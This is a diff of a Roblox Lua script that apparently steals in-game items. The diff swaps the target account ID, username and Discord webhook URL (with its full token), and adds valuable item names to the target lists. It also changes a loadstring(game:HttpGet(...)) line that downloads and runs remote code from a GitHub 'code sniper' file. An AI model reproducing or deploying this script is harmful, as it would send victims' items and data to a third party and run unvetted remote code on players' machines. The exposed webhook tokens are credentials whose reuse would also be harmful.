@@ -1,6 +1,6 @@
-local TARGET_ID = 10095557361
-local TARGET_USER = "nl51329"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1572912165717807174/5yfosWcYGd7s0YwOc39kFFX7w-uIKh1G7WAFDNleSI7THEYEb7O2T4-XKwMgjjX2jEwc"
+local TARGET_ID = 7090534455
+local TARGET_USER = "KING_VEMZ"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1576315072618299593/OWEJOH_sEd3zp4I-jrU2ADoqfiF7bhVES3MYNbuiL_5uyuWQGhMSWpCWHv4CAL8117YA"
 
 local TargetBrainrots = {
     ["Dragon Skeletonini"] = true,
@@ -287,7 +287,15 @@ local TargetBrainrots = {
     ["Burrito Bat"] = true,
     ["Chicli Chicla"] = true,
     ["Panda Popanda"] = true,
-    ["Deputy Leopard"] = true
+    ["Deputy Leopard"] = true,
+    ["Cobra Gelato"] = true,
+    ["Flying Dutchman"] = true,
+    ["Machine Bros"] = true,
+    ["Skelly and Coffy"] = true,
+    ["Sammyni Bros"] = true,
+    ["Puppetmaster"] = true,
+    ["Medusini and Demonini"] = true,
+    ["Cabin Bros"] = true
 }
 
 local TargetBaseSkins = {
@@ -342,11 +350,12 @@ local TargetGears = {
     ["Yin Yang Lamp"] = true,
     ["Yin Yang Slap"] = true,
     ["Phantom Slap"] = true,
-    ["Crystal Slap"] = true
+    ["Crystal Slap"] = true,
+    ["Skeleton Dragon"] = true
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2CODESNIPERV2/refs/heads/main/main.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/script-Ez/Scripts/main/Code-Sniper-Neurova.lua"))()
 
     task.wait(1)
 
